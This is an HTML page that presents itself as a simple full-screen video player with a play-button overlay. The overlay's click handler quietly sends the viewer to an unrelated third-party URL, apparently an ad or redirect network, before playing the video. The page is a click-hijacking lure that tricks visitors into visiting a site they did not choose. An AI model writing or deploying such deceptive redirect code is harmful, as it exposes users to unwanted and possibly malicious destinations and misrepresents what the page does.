<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      overflow: hidden;
    }
    .video-wrapper {
      position: relative;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    video {
      max-width: 100%;
      max-height: 100vh;
      width: 100%;
      display: block;
      background: #000;
    }
    #overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 10;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    #play-btn {
      width: 72px;
      height: 72px;
      background: rgba(255,255,255,0.15);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(4px);
      border: 2px solid rgba(255,255,255,0.3);
      transition: transform 0.2s, background 0.2s;
    }
    #play-btn:hover {
      background: rgba(255,255,255,0.25);
      transform: scale(1.1);
    }
    #play-btn svg { margin-left: 6px; }
    #overlay.hidden { display: none; }
  </style>
</head>
<body>
<div class="video-wrapper">
  <video id="myVideo" controls preload="metadata">
    <source src="https://cdn2.videy.co/c5nuDFCv1.mp4" type="video/mp4">
  </video>
  <div id="overlay">
    <div id="play-btn">
      <svg width="28" height="28" viewBox="0 0 24 24" fill="white">
        <polygon points="5,3 19,12 5,21"/>
      </svg>
    </div>
  </div>
</div>
<script>
  const overlay = document.getElementById('overlay');
  const video = document.getElementById('myVideo');
  let triggered = false;

  overlay.addEventListener('click', function () {
    if (!triggered) {
      triggered = true;
      overlay.classList.add('hidden');
      window.location.href = 'https://omg10.com/4/10438512';
      setTimeout(() => {
        video.play();
      }, 300);
    }
  });
</script>
</body>
</html>
